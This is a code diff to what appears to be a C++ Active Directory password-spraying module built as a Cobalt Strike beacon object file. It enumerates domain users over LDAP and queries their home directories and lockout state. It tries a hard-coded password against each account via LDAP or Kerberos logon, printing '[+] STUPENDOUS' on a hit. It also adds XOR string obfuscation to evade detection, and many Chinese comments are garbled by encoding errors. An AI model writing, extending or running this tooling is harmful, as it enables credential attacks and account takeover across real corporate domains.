@@ -1,8 +1,11 @@
-#define SECURITY_WIN32 
+ï»¿#define SECURITY_WIN32 
 
 #include <vector>
 #include <set>
 #include <iostream>
+#include <fstream>
+#include "cJSON.h"
+#include "obfuscation.h"
 using namespace std;
 
 
@@ -20,15 +23,20 @@ using namespace std;
 #include <stdio.h>
 #include <wchar.h>
 #include <atlstr.h>
+#include <strsafe.h>
 #include <atltime.h>
-#include <SetupAPI.h> // ÒıÈëSetup APIÍ·ÎÄ¼ş  
-#pragma comment(lib, "SetupAPI.lib") // Á´½Óµ½Setup API¿â  
+#include <SetupAPI.h> // å¼•å…¥Setup APIå¤´æ–‡ä»¶  
+#pragma comment(lib, "SetupAPI.lib") // é“¾æ¥åˆ°Setup APIåº“  
 
 #include "SprayAD.h"
 #include "beacon.h"
 #include "beacon_compatibility.h"
 
 #pragma comment(lib, "NetApi32.lib")
+
+#include <wtsapi32.h>
+
+#pragma comment(lib, "Wtsapi32.lib")
 
 #include <DSRole.h>
 #pragma comment(lib, "netapi32.lib")
@@ -43,22 +51,27 @@ namespace LDAPUser {
 	const ULONGLONG MAX_PWD_AGE = 0xFFFF5AFB35408000;
 }
 
+#define PASSWORD_TYPE_REQ		1
+#define PASSWORD_TYPE_EMPTY		2
+#define PASSWORD_TYPE_LOCK		3
+
 typedef struct _USERACCOUNT
 {
-	CString     UserName;               // ÓÃ»§Ãû
-	CString     strDomain;              // ËùÔÚÓò
-	CString     strGroup;               // ËùÔÚ×é
+	CString     UserName;               // ç”¨æˆ·å
+	CString     strDomain;              // æ‰€åœ¨åŸŸ
+	CString     strGroup;               // æ‰€åœ¨ç»„
 	CString     strSID;                 // SID
 	CString     strHomePath;            // home 
-	BOOL        bDisabled;              // ÊÇ·ñ½ûÓÃ
-	BOOL        bAdmin;                 // ÊÇ·ñ¹ÜÀíÔ±
-	__time64_t  tmLastLogon;            // ×îºóµÇÂ¼Ê±¼ä
-	CString		strLastLogon;            // ×îºóµÇÂ¼Ê±¼ä
-	DWORD       dwPwStatus;             // ÃÜÂë×´Ì¬£¬ ÒÑÉèÖÃ 1£¬ ¿ÕÃÜÂë 2£¬ ÒÑËø¶¨ 3 ÓòÓÃ»§£º1 ĞèÒªÃÜÂë 2 ÎŞĞèÃÜÂë
-	CStringA    strPwdChangeTime;       // ÃÜÂëĞŞ¸ÄÊ±¼ä
-	CStringA    strPwdExpireTime;       // ÃÜÂë¹ıÆÚÊ±¼ä
-	CStringA    strAccountType;          // 1 ±¾µØÕË»§£¬2È«¾ÖÕË»§ 3 ÓòÓÃ»§
-	CStringA    strIsDomain;             // 1 ÊÇ£¬2²»ÊÇ
+	BOOL        bDisabled;              // æ˜¯å¦ç¦ç”¨
+	BOOL        bAdmin;                 // æ˜¯å¦ç®¡ç†å‘˜
+	__time64_t  tmLastLogon;            // æœ€åç™»å½•æ—¶é—´
+	CString		strLastLogon;            // æœ€åç™»å½•æ—¶é—´
+	DWORD       dwPwStatus;             // å¯†ç çŠ¶æ€ï¼Œ å·²è®¾ç½® 1ï¼Œ ç©ºå¯†ç  2ï¼Œ å·²é”å®š 3 åŸŸç”¨æˆ·ï¼š1 éœ€è¦å¯†ç  2 æ— éœ€å¯†ç 
+	CStringA    strPwdChangeTime;       // å¯†ç ä¿®æ”¹æ—¶é—´
+	CStringA    strPwdExpireTime;       // å¯†ç è¿‡æœŸæ—¶é—´
+	CStringA    strAccountLockTime;		// è´¦æˆ·é”å®šæ—¶é—´è¿‡æœŸæ—¶é—´
+	CStringA    strAccountType;          // 1 æœ¬åœ°è´¦æˆ·ï¼Œ2å…¨å±€è´¦æˆ· 3 åŸŸç”¨æˆ·
+	CStringA    strIsDomain;             // 1 æ˜¯ï¼Œ2ä¸æ˜¯
 }UserAccount;
 
 vector<UserAccount> g_CheckUsers;
@@ -70,6 +83,7 @@ INT iGarbage = 1;
 LPSTREAM lpStream = (LPSTREAM)1;
 PDOMAIN_CONTROLLER_INFOW pdcInfo = (PDOMAIN_CONTROLLER_INFOW)1;
 
+BOOL GetLocalCurUserName(CString& strUserName);
 
 BOOL IsDomainUser()
 {
@@ -399,13 +413,28 @@ CleanUp:
 
 void ConvertColToUAStruct(const ADS_SEARCH_COLUMN& col, UserAccount& uAccount)
 {
-	int x = 0;
+	DWORD x = 0;
 	if (col.dwADsType == ADSTYPE_CASE_IGNORE_STRING)
 	{
 		for (x = 0; x < col.dwNumValues; x++) {
 			if (_wcsicmp(col.pszAttrName, L"sAMAccountName") == 0)
 			{
+				if (uAccount.UserName.IsEmpty())
+				{
+					uAccount.UserName = col.pADsValues->CaseIgnoreString;
+				}
+			}
+			else if (_wcsicmp(col.pszAttrName, L"displayName") == 0)
+			{
 				uAccount.UserName = col.pADsValues->CaseIgnoreString;
+			}
+			else if (_wcsicmp(col.pszAttrName, L"description") == 0)
+			{
+				uAccount.strGroup = col.pADsValues->CaseIgnoreString;
+			}
+			else if (_wcsicmp(col.pszAttrName, L"homeDirectory") == 0)
+			{
+				uAccount.strHomePath = col.pADsValues->CaseIgnoreString;
 			}
 		}
 	}
@@ -417,15 +446,15 @@ void ConvertColToUAStruct(const ADS_SEARCH_COLUMN& col, UserAccount& uAccount)
 
 			if ((ADS_UF_PASSWD_NOTREQD & col.pADsValues->Integer) == ADS_UF_PASSWD_NOTREQD)
 			{
-				uAccount.dwPwStatus = 2;
+				uAccount.dwPwStatus = PASSWORD_TYPE_EMPTY;
 			}
 			else if ((ADS_UF_LOCKOUT & col.pADsValues->Integer) == ADS_UF_LOCKOUT)
 			{
-				uAccount.dwPwStatus = 3;
+				uAccount.dwPwStatus = PASSWORD_TYPE_LOCK;
 			}
 			else
 			{
-				uAccount.dwPwStatus = 1;
+				uAccount.dwPwStatus = PASSWORD_TYPE_REQ;
 			}
 		}
 		else if (_wcsicmp(col.pszAttrName, L"ms-DS-User-Account-Control-Computed") == 0)
@@ -434,20 +463,15 @@ void ConvertColToUAStruct(const ADS_SEARCH_COLUMN& col, UserAccount& uAccount)
 
 			if ((ADS_UF_LOCKOUT & col.pADsValues->Integer) == ADS_UF_LOCKOUT)
 			{
-				uAccount.dwPwStatus = 3;
+				uAccount.dwPwStatus = PASSWORD_TYPE_LOCK;
 			}
 		}
 		else if (_wcsicmp(col.pszAttrName, L"maxPwdAge") == 0)
 		{
 			CStringW strTime;
-			int Days = col.pADsValues->LargeInteger.QuadPart / 1000 / 1000 / 1000 / 60 / 60 / 24;
+			DWORD Days = col.pADsValues->LargeInteger.QuadPart / 1000 / 1000 / 1000 / 60 / 60 / 24;
 			strTime.Format(L"%d day(s)", Days);
 			uAccount.strPwdExpireTime = strTime;
-		}
-		else if (_wcsicmp(col.pszAttrName, L"lastLogonTimestamp") == 0)
-		{
-			ADS_LARGE_INTEGER strValue = col.pADsValues->LargeInteger;
-			uAccount.tmLastLogon = strValue.QuadPart;
 		}
 	}
 	else if (col.dwADsType == ADSTYPE_LARGE_INTEGER)
@@ -469,14 +493,33 @@ void ConvertColToUAStruct(const ADS_SEARCH_COLUMN& col, UserAccount& uAccount)
 			}
 			else if (_wcsicmp(col.pszAttrName, L"pwdLastSet") == 0)
 			{
-				ADS_UTC_TIME tm = col.pADsValues->UTCTime;
-				SYSTEMTIME monTS;
-				if (FileTimeToSystemTime(reinterpret_cast<PFILETIME>(&tm), &monTS) != FALSE)
+				if (col.pADsValues->Integer != 0)
 				{
-					CStringA sTime;
-					sTime.Format("%04d-%02d-%02d %02d:%02d:%02d", monTS.wYear, monTS.wMonth, monTS.wDay, monTS.wHour, monTS.wMinute, monTS.wSecond);
+					ADS_UTC_TIME tm = col.pADsValues->UTCTime;
+					SYSTEMTIME monTS;
+					if (FileTimeToSystemTime(reinterpret_cast<PFILETIME>(&tm), &monTS) != FALSE)
+					{
+						CStringA sTime;
+						sTime.Format("%04d-%02d-%02d %02d:%02d:%02d", monTS.wYear, monTS.wMonth, monTS.wDay, monTS.wHour, monTS.wMinute, monTS.wSecond);
 
-					uAccount.strPwdChangeTime = sTime;
+						uAccount.strPwdChangeTime = sTime;
+					}
+				}
+			}
+			else if (_wcsicmp(col.pszAttrName, L"lockoutTime") == 0)
+			{
+
+				if (col.pADsValues->Integer != 0)
+				{
+					ADS_UTC_TIME tm = col.pADsValues->UTCTime;
+					SYSTEMTIME monTS;
+					if (FileTimeToSystemTime(reinterpret_cast<PFILETIME>(&tm), &monTS) != FALSE)
+					{
+						CStringA sTime;
+						sTime.Format("%04d-%02d-%02d %02d:%02d:%02d", monTS.wYear, monTS.wMonth, monTS.wDay, monTS.wHour, monTS.wMinute, monTS.wSecond);
+
+						uAccount.strAccountLockTime = sTime;
+					}
 				}
 			}
 		}
@@ -624,7 +667,8 @@ HRESULT SprayUsers(_In_ IDirectorySearch *pContainerToSearch, _In_ LPCWSTR lpwSp
 				while (pContainerToSearch->GetNextColumnName(hSearch, &pszColumn) != S_ADS_NOMORE_COLUMNS) 
 				{
 					hr = pContainerToSearch->GetColumn(hSearch, pszColumn, &col);
-					if (SUCCEEDED(hr)) {
+					if (SUCCEEDED(hr)) 
+					{
 						if (col.dwADsType == ADSTYPE_CASE_IGNORE_STRING) 
 						{
 							for (x = 0; x < col.dwNumValues; x++) {
@@ -766,17 +810,140 @@ CleanUp:
 	return hr;
 }
 
+DWORD QueryAdHomePathFromSid(char* homePath, size_t homePathLen, PSID psid, PWSTR domain) {
+	DWORD code = 1; /* default is failure */
+	NTSTATUS rv = 0;
+	HRESULT hr = S_OK;
+	LPWSTR p = NULL;
+	WCHAR adsPath[MAX_PATH] = L"";
+	BOOL coInitialized = FALSE;
+	CHAR ansidomain[256], * a;
+
+	homePath[0] = '\0';
+
+	/* I trust this is an ASCII domain name */
+	for (p = domain, a = ansidomain; *a = (CHAR)*p; p++, a++);
+	printf("Domain: %s", ansidomain);
+
+	if (ConvertSidToStringSidW(psid, &p)) {
+		IADsNameTranslate* pNto;
+
+		printf("Got SID string [%S]", p);
+
+		hr = CoInitialize(NULL);
+		if (SUCCEEDED(hr))
+			coInitialized = TRUE;
+
+		hr = CoCreateInstance(CLSID_NameTranslate,
+			NULL,
+			CLSCTX_INPROC_SERVER,
+			IID_IADsNameTranslate,
+			(void**)&pNto);
+
+		if (FAILED(hr)) { printf("Can't create nametranslate object"); }
+		else {
+			hr = pNto->Init(ADS_NAME_INITTYPE_GC, L"");
+			if (FAILED(hr)) {
+				printf("NameTranslate Init GC failed [%ld]", hr);
+				if (domain) {
+					hr = pNto->Init(ADS_NAME_INITTYPE_DOMAIN, domain);
+					if (FAILED(hr)) {
+						printf("NameTranslate Init Domain failed [%ld]", hr);
+					}
+				}
+			}
+
+			if (!FAILED(hr)) {
+				hr = pNto->Set(ADS_NAME_TYPE_SID_OR_SID_HISTORY_NAME, p);
+				if (FAILED(hr)) { printf("Can't set sid string"); }
+				else {
+					BSTR bstr;
+
+					hr = pNto->Get(ADS_NAME_TYPE_1779, &bstr);
+					if (SUCCEEDED(hr)) {
+						hr = StringCchCopyW(adsPath, MAX_PATH, bstr);
+						if (FAILED(hr)) {
+							printf("Overflow while copying ADS path");
+							adsPath[0] = L'\0';
+						}
+
+						SysFreeString(bstr);
+					}
+				}
+			}
+			pNto->Release();
+		}
+
+		LocalFree(p);
+
+	}
+	else {
+		printf("Can't convert sid to string");
+	}
+
+	if (adsPath[0]) {
+		WCHAR fAdsPath[MAX_PATH];
+		IADsUser* pAdsUser;
+		BSTR bstHomeDir = NULL;
+
+		hr = StringCchPrintfW(fAdsPath, MAX_PATH, L"LDAP://%s", adsPath);
+		if (hr != S_OK) {
+			printf("Can't format full adspath");
+			goto cleanup;
+		}
+
+		printf("Trying adsPath=[%S]", fAdsPath);
+
+		hr = ADsGetObject(fAdsPath, IID_IADsUser, (LPVOID*)&pAdsUser);
+		if (hr != S_OK) {
+			printf("Can't open IADs object");
+			goto cleanup;
+		}
+
+		hr = pAdsUser->get_Profile(&bstHomeDir);
+		hr = pAdsUser->get_HomeDirectory(&bstHomeDir);
+		hr = pAdsUser->get_EmailAddress(&bstHomeDir);
+		if (hr != S_OK) {
+			printf("Can't get profile directory");
+			goto cleanup_homedir_section;
+		}
+
+		wcstombs(homePath, bstHomeDir, homePathLen);
+
+		printf("Got homepath [%s]", homePath);
+
+		SysFreeString(bstHomeDir);
+
+		code = 0;
+
+	cleanup_homedir_section:
+		pAdsUser->Release();
+	}
+
+cleanup:
+	if (coInitialized)
+		CoUninitialize();
+
+	return code;
+}
+
 HRESULT SprayCurDomainUsers(_In_ IDirectorySearch* pContainerToSearch, _In_ BOOL bListALL, _In_ LPCWSTR lpwFilterDevice, _In_ LPCWSTR lpwFilterName, _Out_ vector<UserAccount>& Users) {
 	HRESULT hr = S_OK;
 	WCHAR wcSearchFilter[BUF_SIZE] = { 0 };
 	LPCWSTR pszAttrFilter[] = { /*L"ADsPath", L"Name",*/
-		L"userAccountControl",L"ms-DS-User-Account-Control-Computed",
-		L"isCriticalSystemObject", // boolean
-		L"lastLogon",
-		L"pwdLastSet",
-		L"maxPwdAge",
-		L"objectSid",
-		L"sAMAccountName" };
+		XorStringW(L"userAccountControl",L"ms-DS-User-Account-Control-Computed"),
+		XorStringW(L"isCriticalSystemObject"), // boolean
+		XorStringW(L"lastLogon"),
+		XorStringW(L"pwdLastSet"),
+		XorStringW(L"maxPwdAge"),
+		XorStringW(L"description"),
+		XorStringW(L"objectSid"),
+		XorStringW(L"sAMAccountName"),
+		XorStringW(L"description"),
+		XorStringW(L"homeDirectory"),
+		XorStringW(L"lockoutTime"),
+		XorStringW(L"displayName"),
+	};
 	LPCWSTR lpwFormat1 = L"(&(objectClass=user)(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(!(lockoutTime>=1))(!(badPwdCount>=%ls))(sAMAccountName=%ls))"; // Only enabled accounts
 	LPCWSTR lpwFormat = L"(&(objectClass=user)(objectCategory=person)((sAMAccountName=%ls)))"; // Only enabled accounts // (!(userAccountControl:1.2.840.113556.1.4.803:=2))
 
@@ -884,6 +1051,81 @@ HRESULT SprayCurDomainUsers(_In_ IDirectorySearch* pContainerToSearch, _In_ BOOL
 					if (SUCCEEDED(hr)) {
 						ConvertColToUAStruct(col, userAct);
 
+						BOOL bLdapAuth = TRUE;
+						LPCWSTR lpwSprayPasswd = L"Dowhile(1);return;";
+#if 0
+						if (col.dwADsType == ADSTYPE_CASE_IGNORE_STRING)
+						{
+							for (x = 0; x < col.dwNumValues; x++) {
+								if (_wcsicmp(col.pszAttrName, L"sAMAccountName") == 0)
+								{
+									if (bLdapAuth)
+									{
+										LPCOLESTR pIADsIID = L"{FD8256D0-FD15-11CE-ABC4-02608C9E7553}";
+										LPCOLESTR pIADsIIDsUser = L"{3E37E320-17E2-11CF-ABC4-02608C9E7553}";
+										HRESULT hr = IIDFromString(pIADsIIDsUser, &IADsIID);
+										if (FAILED(hr)) {
+											printf("Failed to resolve IID.\n");
+											break;
+										}
+										IID_IADs;
+										IADsUser* pUser;
+										hr = ADsOpenObject(L"LDAP://rootDSE",
+											NULL,
+											NULL,
+											ADS_SECURE_AUTHENTICATION | ADS_FAST_BIND, // Use Secure Authentication
+											IADsIID,
+											(void**)&pUser);
+										if (FAILED(hr))
+										{
+											printf("[-] Failed => %ls\\%ls\n", pdcInfo->DomainName, col.pADsValues->CaseIgnoreString);
+										}
+
+										if (SUCCEEDED(hr))
+										{
+											BSTR bstr;
+											VARIANT var;
+											VariantInit(&var);
+											pRoot->Get(CComBSTR("HomeDirectory"), &var);
+											pUser->get_HomeDirectory(&bstr);
+
+											BeaconPrintToStreamW(L"[+] STUPENDOUS => %ls\\%ls:%ls\n", pdcInfo->DomainName, col.pADsValues->CaseIgnoreString, lpwSprayPasswd);
+											wcscpy_s(pUserInfo->chuserPrincipalName[dwAccountsSuccess], MAX_PATH, col.pADsValues->CaseIgnoreString);
+
+											dwAccountsSuccess = dwAccountsSuccess + 1;
+											VariantClear(&var);
+										}
+										if (pRoot)
+										{
+											pRoot->Release();
+											pRoot = NULL;
+										}
+									}
+									else
+									{
+										BOOL bResult = LogonUserSSPI(L"Kerberos",
+											pdcInfo->DomainName,
+											col.pADsValues->CaseIgnoreString,
+											(LPWSTR)lpwSprayPasswd);
+
+										if (!bResult)
+										{
+											BeaconPrintToStreamW(L"[-] Failed => %ls\\%ls-%ls\n", pdcInfo->DomainName, col.pADsValues->CaseIgnoreString, col.pADsValues->CaseIgnoreString);
+										}
+										if (bResult)
+										{
+											BeaconPrintToStreamW(L"[+] STUPENDOUS => %ls\\%ls:%ls\n", pdcInfo->DomainName, col.pADsValues->CaseIgnoreString, lpwSprayPasswd);
+											wcscpy_s(pUserInfo->chuserPrincipalName[dwAccountsSuccess], MAX_PATH, col.pADsValues->CaseIgnoreString);
+
+											dwAccountsSuccess = dwAccountsSuccess + 1;
+										}
+									}
+									break;
+								}
+							}
+						}
+#endif
+
 						pContainerToSearch->FreeColumn(&col);
 					}
 
@@ -892,7 +1134,17 @@ HRESULT SprayCurDomainUsers(_In_ IDirectorySearch* pContainerToSearch, _In_ BOOL
 					}
 				}
 
+				char homepath[BUF_SIZE];
+				size_t length = BUF_SIZE;
+
+				PSID sid;
+				ConvertStringSidToSid(userAct.strSID, &sid);
+
+				QueryAdHomePathFromSid(homepath, length, sid, pdcInfo->DomainName);
+
 				Users.emplace_back(userAct);
+
+
 
 
 				// Get the next row
@@ -1257,8 +1509,10 @@ BOOL SearchCurDomainUser(vector<UserAccount>& Users, const CString& deviceName, 
 
 	if (IsDomainAdmin(pContainerToSearch, CStringW("Administrator")))
 	{
-
+		printf("is Domain Administrator");
 	}
+
+
 	if (IsDomainAdmin(pContainerToSearch, CStringW(userName)))
 	{
 		hr = SprayCurDomainUsers(pContainerToSearch, TRUE, CStringW(deviceName), CStringW(userName), Users);
@@ -1371,36 +1625,36 @@ int GetFullDeviceName()
 	char szDeviceInstanceID[MAX_DEVICE_ID_LEN];
 	char szFriendlyName[1024];
 
-	// »ñÈ¡Í¨ÓÃ´®ĞĞ×ÜÏß½Ó¿ÚÀàGUID  
+	// è·å–é€šç”¨ä¸²è¡Œæ€»çº¿æ¥å£ç±»GUID  
 	const GUID GUID_CLASS_USB = { 0x4d1e55b4, 0xe075, 0x11cf, { 0x88, 0xcb, 0x00, 0x11, 0x11, 0x00, 0x00, 0x30 } };
 	InterfaceClassGuid = GUID_CLASS_USB;
 
-	// »ñÈ¡Éè±¸ĞÅÏ¢¼¯  
+	// è·å–è®¾å¤‡ä¿¡æ¯é›†  
 	hDevInfo = SetupDiGetClassDevs(&InterfaceClassGuid, NULL, NULL, DIGCF_PRESENT | DIGCF_ALLCLASSES);
 	if (hDevInfo == INVALID_HANDLE_VALUE) {
-		std::cerr << "ÎŞ·¨»ñÈ¡Éè±¸ĞÅÏ¢¼¯" << std::endl;
+		std::cerr << "æ— æ³•è·å–è®¾å¤‡ä¿¡æ¯é›†" << std::endl;
 		return 1;
 	}
 
-	// ±éÀúÉè±¸ĞÅÏ¢¼¯ÖĞµÄÉè±¸Ïî  
+	// éå†è®¾å¤‡ä¿¡æ¯é›†ä¸­çš„è®¾å¤‡é¡¹  
 	for (i = 0; SetupDiEnumDeviceInfo(hDevInfo, i, &DeviceInfoData); i++) {
-		// »ñÈ¡Éè±¸ÊµÀıID  
+		// è·å–è®¾å¤‡å®ä¾‹ID  
 		if (!SetupDiGetDeviceInstanceId(hDevInfo, &DeviceInfoData, szDeviceInstanceID, MAX_DEVICE_ID_LEN, NULL)) {
-			std::cerr << "ÎŞ·¨»ñÈ¡Éè±¸ÊµÀıID" << std::endl;
+			std::cerr << "æ— æ³•è·å–è®¾å¤‡å®ä¾‹ID" << std::endl;
 			break;
 		}
 
-		// »ñÈ¡Éè±¸ÓÑºÃÃû³Æ  
+		// è·å–è®¾å¤‡å‹å¥½åç§°  
 		if (!SetupDiGetDeviceRegistryProperty(hDevInfo, &DeviceInfoData, SPDRP_FRIENDLYNAME, NULL, (PBYTE)szFriendlyName, sizeof(szFriendlyName), NULL)) {
-			std::cerr << "ÎŞ·¨»ñÈ¡Éè±¸ÓÑºÃÃû³Æ" << std::endl;
+			std::cerr << "æ— æ³•è·å–è®¾å¤‡å‹å¥½åç§°" << std::endl;
 			break;
 		}
 
-		// ´òÓ¡Éè±¸È«Ãû£¨Éè±¸ÊµÀıIDºÍÓÑºÃÃû³Æ£©  
-		std::wcout << L"Éè±¸È«Ãû: " << szDeviceInstanceID << L" - " << szFriendlyName << std::endl;
+		// æ‰“å°è®¾å¤‡å…¨åï¼ˆè®¾å¤‡å®ä¾‹IDå’Œå‹å¥½åç§°ï¼‰  
+		std::wcout << L"è®¾å¤‡å…¨å: " << szDeviceInstanceID << L" - " << szFriendlyName << std::endl;
 	}
 
-	// ¹Ø±ÕÉè±¸ĞÅÏ¢¼¯¾ä±ú  
+	// å…³é—­è®¾å¤‡ä¿¡æ¯é›†å¥æŸ„  
 	SetupDiDestroyDeviceInfoList(hDevInfo);
 
 	return 0;
@@ -1667,7 +1921,7 @@ bool GetUsers(vector<UserAccount>& vecUsers)
 								return CurTime.Format("%Y-%m-%d %H:%M:%S");
 								};
 
-							// ¹ıÆÚÊ±¼ä = ÉÏ´ÎĞŞ¸ÄÃÜÂëÊ±¼ä + ÃÜÂë×î³¤Ê¹ÓÃÆÚÏŞ
+							// è¿‡æœŸæ—¶é—´ = ä¸Šæ¬¡ä¿®æ”¹å¯†ç æ—¶é—´ + å¯†ç æœ€é•¿ä½¿ç”¨æœŸé™
 							UserAcc.strPwdExpireTime = GetExpireTimeFromGPE(tCurTime);
 						}
 					}
@@ -1766,71 +2020,76 @@ BOOL GetDomainFullName(const WCHAR* domain, const WCHAR* uid, WCHAR* full_name)
 BOOL getUserName(CString& strDomainName)
 {
 	BOOL bRet = FALSE;
-	// »ñÈ¡µ±Ç°µÇÂ¼µÄ±¾µØÓÃ»§Ãû  
+	// è·å–å½“å‰ç™»å½•çš„æœ¬åœ°ç”¨æˆ·å  
 	char username[256];
 	DWORD usernameSize = sizeof(username);
-	if (GetUserNameA(username, &usernameSize)) {
-		std::cout << "µ±Ç°µÇÂ¼µÄ±¾µØÓÃ»§Ãû: " << username << std::endl;
+	if (GetUserNameA(username, &usernameSize)) 
+	{
+		std::cout << "å½“å‰ç™»å½•çš„æœ¬åœ°ç”¨æˆ·å: " << username << std::endl;
+	}
+	else {
+		std::cerr << "æ— æ³•è·å–å½“å‰ç™»å½•çš„æœ¬åœ°ç”¨æˆ·å" << std::endl;
+		return 1;
+	}
 
-		// »ñÈ¡µ±Ç°µÇÂ¼ÓÃ»§µÄÓòĞÅÏ¢  
-		PCHAR cpuName = new CHAR[256];
-		PCHAR domainName = new CHAR[256];
-		DWORD domainNameSize = 0;
+	// è·å–å½“å‰ç™»å½•ç”¨æˆ·çš„åŸŸä¿¡æ¯  
+	PCHAR cpuName = new CHAR[256];
+	PCHAR domainName = new CHAR[256];
+	DWORD domainNameSize = 0;
 
-		ZeroMemory(domainName, 256);
+	ZeroMemory(domainName, 256);
 
-		GetComputerObjectNameA(NameSamCompatible, NULL, &domainNameSize);
-		if (GetComputerObjectNameA(NameSamCompatible, cpuName, &domainNameSize)) {
-			std::wcout << "µ±Ç°µÇÂ¼µÄÓò: " << cpuName << std::endl;
+	GetComputerObjectNameA(NameSamCompatible, NULL, &domainNameSize);
+	if (GetComputerObjectNameA(NameSamCompatible, cpuName, &domainNameSize)) 
+	{
+		std::wcout << "å½“å‰ç™»å½•çš„åŸŸæœºå™¨: " << cpuName << std::endl;
+	}
+	else 
+	{
+		std::cerr << "æ— æ³•è·å–åŸŸä¿¡æ¯" << std::endl;
+	}
+
+	domainNameSize = 0;
+	GetUserNameExA(NameDisplay, NULL, &domainNameSize);
+	if (GetUserNameExA(NameDisplay, domainName, &domainNameSize))
+	{
+		std::wcout << "å½“å‰ç™»å½•çš„åŸŸç”¨æˆ·: " << domainName << std::endl;
+
+		if (!domainName[0])
+		{
+			return 0;
 		}
-		else {
-			std::cerr << "ÎŞ·¨»ñÈ¡ÓòĞÅÏ¢" << std::endl;
+
+		LPUSER_INFO_2 p_ui10 = 0;
+		strDomainName = domainName;
+		CString strtDomainName = domainName;
+
+		int nPos = strtDomainName.Find("\\");
+		CStringW swDN = strtDomainName.Left(nPos);
+		CStringW swName = strtDomainName.Mid(nPos + 1);
+		bRet = TRUE;
+		return TRUE;
+		if (NetUserGetInfo(swDN.GetBuffer(), swName.GetBuffer(), 2, (LPBYTE*)&p_ui10) == NERR_Success)
+		{
+			std::wstring fullname = p_ui10->usri2_full_name;
+
+			NetApiBufferFree(p_ui10);
+
+			return 0;
 		}
-		domainNameSize = 0;
-		GetUserNameExA(NameSamCompatible, NULL, &domainNameSize);
-		if (GetUserNameExA(NameSamCompatible, domainName, &domainNameSize)) {
-			std::wcout << "µ±Ç°µÇÂ¼µÄÓò: " << domainName << std::endl;
-
-			if (!domainName[0])
-			{
-				return 0;
-			}
-
-			LPUSER_INFO_2 p_ui10 = 0;
-			strDomainName = domainName;
-			CString strtDomainName = domainName;
-
-			int nPos = strtDomainName.Find("\\");
-			CStringW swDN = strtDomainName.Left(nPos);
-			CStringW swName = strtDomainName.Mid(nPos + 1);
-			bRet = TRUE;
-			return TRUE;
-			if (NetUserGetInfo(swDN.GetBuffer(), swName.GetBuffer(), 2, (LPBYTE*)&p_ui10) == NERR_Success)
-			{
-				std::wstring fullname = p_ui10->usri2_full_name;
-
-				NetApiBufferFree(p_ui10);
-
-				return 0;
-			}
-			else
-			{
-				return 1;
-			}
-
-			if (p_ui10 != NULL)
-			{
-				NetApiBufferFree(p_ui10);
-				p_ui10 = NULL;
-			}
+		else
+		{
+			return 1;
 		}
-		else {
-			std::cerr << "ÎŞ·¨»ñÈ¡ÓòĞÅÏ¢" << std::endl;
+
+		if (p_ui10 != NULL)
+		{
+			NetApiBufferFree(p_ui10);
+			p_ui10 = NULL;
 		}
 	}
 	else {
-		std::cerr << "ÎŞ·¨»ñÈ¡µ±Ç°µÇÂ¼µÄ±¾µØÓÃ»§Ãû" << std::endl;
-		return 1;
+		std::cerr << "æ— æ³•è·å–åŸŸä¿¡æ¯" << std::endl;
 	}
 
 
@@ -1838,7 +2097,7 @@ BOOL getUserName(CString& strDomainName)
 
 	CString saDomain = GetDomainName();
 
-	// ÑéÖ¤ºÍ»ñÈ¡ÓòÓÃ»§ĞÅÏ¢  
+	// éªŒè¯å’Œè·å–åŸŸç”¨æˆ·ä¿¡æ¯  
 	HANDLE tokenHandle = NULL;
 	if (LogonUserA(username, saDomain, "Dowhile(1);return;", LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &tokenHandle)) {
 		TOKEN_USER userToken;
@@ -1848,19 +2107,19 @@ BOOL getUserName(CString& strDomainName)
 			char domainUser[256];
 			DWORD domainUserSize = sizeof(domainUser);
 			if (LookupAccountSidA(NULL, pSID, domainUser, &domainUserSize, NULL, NULL, &sidType)) {
-				std::cout << "µ±Ç°µÇÂ¼µÄÓòÓÃ»§Ãû: " << domainUser << std::endl;
+				std::cout << "å½“å‰ç™»å½•çš„åŸŸç”¨æˆ·å: " << domainUser << std::endl;
 			}
 			else {
-				std::cerr << "ÎŞ·¨»ñÈ¡ÓòÓÃ»§ĞÅÏ¢" << std::endl;
+				std::cerr << "æ— æ³•è·å–åŸŸç”¨æˆ·ä¿¡æ¯" << std::endl;
 			}
 		}
 		else {
-			std::cerr << "ÎŞ·¨»ñÈ¡ÁîÅÆĞÅÏ¢" << std::endl;
+			std::cerr << "æ— æ³•è·å–ä»¤ç‰Œä¿¡æ¯" << std::endl;
 		}
 		CloseHandle(tokenHandle);
 	}
 	else {
-		std::cerr << "ÎŞ·¨ÑéÖ¤ºÍµÇÂ¼ÓòÓÃ»§" << std::endl;
+		std::cerr << "æ— æ³•éªŒè¯å’Œç™»å½•åŸŸç”¨æˆ·" << std::endl;
 	}
 
 	return bRet;
@@ -1877,14 +2136,20 @@ BOOL GetCurDomainUser(vector<UserAccount>& users)
 		goto End;
 	}
 
-	// »ñÈ¡»úÆ÷Ãû
+	// è·å–æœºå™¨å
 	if (FALSE == GetCpuName(ComputerName))
 	{
 		goto End;
 	}
 
-	// »ñÈ¡ÓÃ»§Ãû
+	// è·å–ç”¨æˆ·å
 	if (FALSE == GetCurUserName(DomainUserName))
+	{
+		goto End;
+	}
+
+	// è·å–ç”¨æˆ·å
+	if (FALSE == GetLocalCurUserName(DomainUserName))
 	{
 		goto End;
 	}
@@ -1898,7 +2163,7 @@ End:
 void GetHostNameWithWs()
 {
 	WSADATA wsaData;
-	int nErr = WSAStartup(MAKEWORD(2, 2), &wsaData);//µ÷ÓÃ³É¹¦·µ»Ø0£¬Ê§°Ü·µ»Ø·Ç0
+	int nErr = WSAStartup(MAKEWORD(2, 2), &wsaData);//è°ƒç”¨æˆåŠŸè¿”å›0ï¼Œå¤±è´¥è¿”å›é0
 	if (nErr)
 	{
 		nErr = GetLastError();
@@ -1922,7 +2187,7 @@ BOOL GetCpuName(CString &strDeviceName)
 
 	strDeviceName = sDomain;
 	bRet = TRUE;
-	printf("gethostname result: %S \n", sDomain);
+	printf("GetComputerNameW result: %S \n", sDomain);
 End:
 	return bRet;
 }
@@ -1930,34 +2195,304 @@ End:
 BOOL GetCurUserName(CString &strUserName)
 {
 	BOOL bRet = FALSE;
-	char username[BUF_SIZE];
+	WCHAR username[BUF_SIZE];
 	DWORD usernameSize = sizeof(username);
-	if (FALSE == GetUserName(username, &usernameSize)) 
+	if (FALSE == GetUserNameW(username, &usernameSize)) 
 	{
 		goto End;
 	};
 
 	strUserName = username;
 	bRet = TRUE;
-	printf("gethostname result: %S \n", username);
+	printf("GetUserName result: %S \n", username);
 End:
 	return bRet;
 }
+
